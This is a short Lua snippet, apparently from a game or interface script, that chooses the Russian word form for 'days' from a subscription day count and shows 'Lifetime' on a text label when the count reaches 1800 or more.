if dayskolvo then
if dayskolvo == 0 then
textdaystype = "дней"
elseif dayskolvo >= 5 then
textdaystype = "дней"
elseif dayskolvo >= 2 then
textdaystype = "дня"
elseif dayskolvo == 1 then
textdaystype = "день"
else
textdaystype = "дней"
end
else
textdaystype = "дней"
end

if dayskolvo then

if dayskolvo >= 1800 then
subs:SetText("Lifetime")
else
subs:SetText(dayskolvo.." "..textdaystype)
end


end



